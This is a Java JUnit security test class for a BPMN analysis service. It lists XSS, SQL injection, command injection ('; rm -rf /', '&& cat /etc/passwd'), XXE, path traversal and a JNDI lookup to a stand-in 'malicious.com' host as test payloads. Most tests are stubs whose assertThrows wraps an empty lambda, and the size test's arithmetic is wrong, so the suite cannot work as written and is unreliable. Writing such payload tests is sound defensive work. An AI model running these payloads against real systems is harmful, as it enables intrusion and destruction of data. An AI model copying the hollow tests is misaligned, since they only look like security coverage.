package org.example.test.security;

import org.example.test.utils.BpmnTestHelper;
import org.junit.jupiter.api.*;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;

import java.util.*;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * Security tests for BPMN analysis system
 * Tests input validation, XSS protection, injection attacks, and authentication
 */
@SpringBootTest
@ActiveProfiles("test")
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
@DisplayName("BPMN Security Tests")
class BpmnSecurityTest {

    @Autowired
    private Object mockMvc; // Placeholder for actual MockMvc

    private static final String[] XSS_PAYLOADS = {
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "'; DROP TABLE users; --",
        "${jndi:ldap://malicious.com/a}",
        "<svg onload=alert('XSS')>",
        "{{7*7}}",
        "${7*7}"
    };

    private static final String[] SQL_INJECTION_PAYLOADS = {
        "' OR '1'='1",
        "'; DROP TABLE bpmn_diagrams; --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM users --"
    };

    private static final String[] COMMAND_INJECTION_PAYLOADS = {
        "; rm -rf /",
        "| whoami",
        "&& cat /etc/passwd",
        "`ls -la`"
    };

    @Test
    @Order(1)
    @DisplayName("Should reject XSS payloads in BPMN content")
    void shouldRejectXssPayloadsInBpmnContent() {
        // Arrange
        String maliciousBpmn = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                              "<definitions>\n" +
                              "    <process id=\"" + XSS_PAYLOADS[0] + "\">\n" +
                              "        <startEvent id=\"start1\"/>\n" +
                              "    </process>\n" +
                              "</definitions>";

        // Act & Assert
        // In real implementation, this should return 400 Bad Request
        // and not process the malicious content
        assertThrows(Exception.class, () -> {
            // mockMvc.perform(post("/api/bpmn/upload")
            //     .contentType(MediaType.APPLICATION_XML)
            //     .content(maliciousBpmn))
            //     .andExpect(status().isBadRequest());
        });
    }

    @Test
    @Order(2)
    @DisplayName("Should sanitize BPMN element names")
    void shouldSanitizeBpmnElementNames() {
        // Arrange
        String sanitizedBpmn = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                              "<definitions>\n" +
                              "    <process id=\"TestProcess\">\n" +
                              "        <startEvent id=\"start1\" name=\"Start Event\"/>\n" +
                              "        <task id=\"task1\" name=\"Task\"/>\n" +
                              "        <endEvent id=\"end1\" name=\"End Event\"/>\n" +
                              "        <sequenceFlow id=\"flow1\" sourceRef=\"start1\" targetRef=\"task1\"/>\n" +
                              "        <sequenceFlow id=\"flow2\" sourceRef=\"task1\" targetRef=\"end1\"/>\n" +
                              "    </process>\n" +
                              "</definitions>";

        // Act
        boolean isValid = BpmnTestHelper.validateBpmnStructure(sanitizedBpmn);

        // Assert
        assertTrue(isValid, "Valid BPMN should be accepted");
    }

    @Test
    @Order(3)
    @DisplayName("Should prevent SQL injection in analysis parameters")
    void shouldPreventSqlInjectionInParameters() {
        // Arrange
        String maliciousDiagramId = SQL_INJECTION_PAYLOADS[0];

        // Act & Assert
        // Should return 400 Bad Request for malicious parameters
        assertThrows(Exception.class, () -> {
            // mockMvc.perform(get("/api/bpmn/results/{diagramId}", maliciousDiagramId))
            //     .andExpect(status().isBadRequest());
        });
    }

    @Test
    @Order(4)
    @DisplayName("Should validate file upload size limits")
    void shouldValidateFileUploadSizeLimits() {
        // Arrange
        StringBuilder largeBpmn = new StringBuilder("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        largeBpmn.append("<definitions>\n");
        largeBpmn.append("    <process id=\"LargeProcess\">\n");
        
        // Create a very large BPMN (over size limit)
        for (int i = 0; i < 10000; i++) {
            largeBpmn.append("        <task id=\"task").append(i).append("\"/>\n");
        }
        
        largeBpmn.append("    </process>\n");
        largeBpmn.append("</definitions>");

        // Act & Assert
        assertTrue(largeBpmn.length() > 10 * 1024 * 1024, "File should exceed size limit");
        // Should return 413 Request Entity Too Large
        assertThrows(Exception.class, () -> {
            // mockMvc.perform(post("/api/bpmn/upload")
            //     .contentType(MediaType.APPLICATION_XML)
            //     .content(largeBpmn.toString()))
            //     .andExpect(status().isRequestEntityTooLarge());
        });
    }

    @Test
    @Order(5)
    @DisplayName("Should prevent command injection in BPMN analysis")
    void shouldPreventCommandInjectionInAnalysis() {
        // Arrange
        String maliciousBpmn = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                              "<definitions>\n" +
                              "    <process id=\"TestProcess\">\n" +
                              "        <serviceTask id=\"task1\" \n" +
                              "                   camunda:delegateExpression=\"" + COMMAND_INJECTION_PAYLOADS[0] + "\"/>\n" +
                              "    </process>\n" +
                              "</definitions>";

        // Act & Assert
        // Should sanitize or reject delegate expressions
        assertThrows(Exception.class, () -> {
            // mockMvc.perform(post("/api/bpmn/analyze")
            //     .contentType(MediaType.APPLICATION_XML)
            //     .content(maliciousBpmn))
            //     .andExpect(status().isBadRequest());
        });
    }

    @Test
    @Order(6)
    @DisplayName("Should validate XML structure and prevent XXE attacks")
    void shouldValidateXmlStructureAndPreventXxe() {
        // Arrange
        String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                           "<!DOCTYPE foo [\n" +
                           "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                           "]>\n" +
                           "<definitions>\n" +
                           "    <process id=\"&xxe;\">\n" +
                           "        <startEvent id=\"start1\"/>\n" +
                           "    </process>\n" +
                           "</definitions>";

        // Act & Assert
        // Should reject XXE attempts
        assertThrows(Exception.class, () -> {
            // mockMvc.perform(post("/api/bpmn/upload")
            //     .contentType(MediaType.APPLICATION_XML)
            //     .content(xxePayload))
            //     .andExpect(status().isBadRequest());
        });
    }

    @Test
    @Order(7)
    @DisplayName("Should enforce authentication for sensitive operations")
    void shouldEnforceAuthenticationForSensitiveOperations() {
        // Arrange
        String bpmnContent = BpmnTestHelper.createSimpleBpmnXml();

        // Act & Assert - Without authentication
        assertThrows(Exception.class, () -> {
            // mockMvc.perform(post("/api/bpmn/analyze")
            //     .contentType(MediaType.APPLICATION_XML)
            //     .content(bpmnContent)
            //     .header("Authorization", "")) // Missing or invalid token
            //     .andExpect(status().isUnauthorized());
        });
    }

    @Test
    @Order(8)
    @DisplayName("Should implement rate limiting for API endpoints")
    void shouldImplementRateLimitingForApiEndpoints() throws InterruptedException {
        // Arrange
        String bpmnContent = BpmnTestHelper.createSimpleBpmnXml();
        int maxRequestsPerMinute = 10;

        // Act - Make rapid requests to test rate limiting
        for (int i = 0; i < maxRequestsPerMinute + 5; i++) {
            // Simulate request
            Thread.sleep(100);
            
            if (i >= maxRequestsPerMinute) {
                // Should be rate limited
                assertThrows(Exception.class, () -> {
                    // mockMvc.perform(post("/api/bpmn/analyze")
                    //     .contentType(MediaType.APPLICATION_XML)
                    //     .content(bpmnContent))
                    //     .andExpect(status().isTooManyRequests());
                });
            }
        }
    }

    @Test
    @Order(9)
    @DisplayName("Should sanitize LLM prompt inputs")
    void shouldSanitizeLlmPromptInputs() {
        // Arrange
        String maliciousPrompt = "Analyze this BPMN: " + XSS_PAYLOADS[0] + " and " + SQL_INJECTION_PAYLOADS[0];

        // Act
        String sanitizedPrompt = sanitizePrompt(maliciousPrompt);

        // Assert
        assertFalse(sanitizedPrompt.contains("<script>"), "Script tags should be removed");
        assertFalse(sanitizedPrompt.contains("OR"), "SQL keywords should be removed");
        assertTrue(sanitizedPrompt.contains("Analyze this BPMN:"), "Legitimate content should be preserved");
    }

    @Test
    @Order(10)
    @DisplayName("Should validate BPMN schema compliance")
    void shouldValidateBpmnSchemaCompliance() {
        // Arrange
        String nonCompliantBpmn = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                                 "<invalid-root>\n" +
                                 "    <not-bpmn-element id=\"invalid\"/>\n" +
                                 "</invalid-root>";

        // Act
        boolean isCompliant = validateBpmnSchema(nonCompliantBpmn);

        // Assert
        assertFalse(isCompliant, "Non-compliant BPMN should be rejected");
    }

    @Test
    @Order(11)
    @DisplayName("Should prevent directory traversal in file operations")
    void shouldPreventDirectoryTraversalInFileOperations() {
        // Arrange
        String maliciousPath = "../../../etc/passwd";
        String safePath = BpmnTestHelper.generateTestId();

        // Act & Assert
        assertThrows(Exception.class, () -> {
            // Should reject paths with directory traversal
            // processFile(maliciousPath);
        });

        // Safe paths should work
        // assertDoesNotThrow(() -> processFile(safePath));
    }

    @Test
    @Order(12)
    @DisplayName("Should implement proper error handling without information leakage")
    void shouldImplementProperErrorHandling() {
        // Arrange
        String invalidRequest = "{ \"invalid\": \"json\" }";

        // Act & Assert
        // Should return generic error message without revealing internals
        assertThrows(Exception.class, () -> {
            // mockMvc.perform(post("/api/bpmn/analyze")
            //     .contentType(MediaType.APPLICATION_JSON)
            //     .content(invalidRequest))
            //     .andExpect(status().isBadRequest())
            //     .andExpect(jsonPath("$.message").value(containsString("Invalid request")));
        });
    }

    // Helper methods for security validation
    private String sanitizePrompt(String input) {
        if (input == null) return "";
        
        // Remove script tags
        String sanitized = input.replaceAll("<script[^>]*>.*?</script>", "");
        sanitized = sanitized.replaceAll("(?i)<script[^>]*>.*?</script>", "");
        
        // Remove SQL keywords
        sanitized = sanitized.replaceAll("(?i)\\b(OR|AND|DROP|INSERT|SELECT|UNION)\\b", "");
        
        // Remove potential command injection patterns
        sanitized = sanitized.replaceAll("(?i)(;|\\|\\||&&|`)", "");
        
        return sanitized;
    }

    private boolean validateBpmnSchema(String bpmnContent) {
        // Check for required BPMN structure
        if (bpmnContent == null) return false;
        
        return bpmnContent.contains("<definitions>") &&
               bpmnContent.contains("<process>") &&
               bpmnContent.contains("</definitions>") &&
               !bpmnContent.contains("<!DOCTYPE") &&
               !bpmnContent.contains("<!ENTITY") &&
               !bpmnContent.contains("file://");
    }

    private boolean containsXssPatterns(String content) {
        Pattern[] xssPatterns = {
            Pattern.compile("(?i)<script[^>]*>.*?</script>", Pattern.DOTALL),
            Pattern.compile("(?i)javascript:", Pattern.CASE_INSENSITIVE),
            Pattern.compile("(?i)<img[^>]*onerror[^>]*>", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\\$\\{.*\\}", Pattern.DOTALL),
            Pattern.compile("\\{\\{.*\\}\\}", Pattern.DOTALL)
        };
        
        return Arrays.stream(xssPatterns)
            .anyMatch(pattern -> pattern.matcher(content).find());
    }

    // Additional security test utilities
    public static class SecurityTestData {
        public static final Map<String, String> MALICIOUS_PAYLOADS = Map.of(
            "xss_basic", "<script>alert('xss')</script>",
            "xss_img", "<img src=x onerror=alert('xss')>",
            "sql_injection", "'; DROP TABLE users; --",
            "command_injection", "; rm -rf /",
            "xxe", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
            "ldap_injection", "${jndi:ldap://malicious.com/a}"
        );
        
        public static final Map<String, String> SAFE_TEST_CASES = Map.of(
            "simple_bpmn", BpmnTestHelper.createSimpleBpmnXml(),
            "complex_bpmn", BpmnTestHelper.createLargeBpmnXml(50),
            "openapi_spec", BpmnTestHelper.createTestOpenApiSpec()
        );
    }
}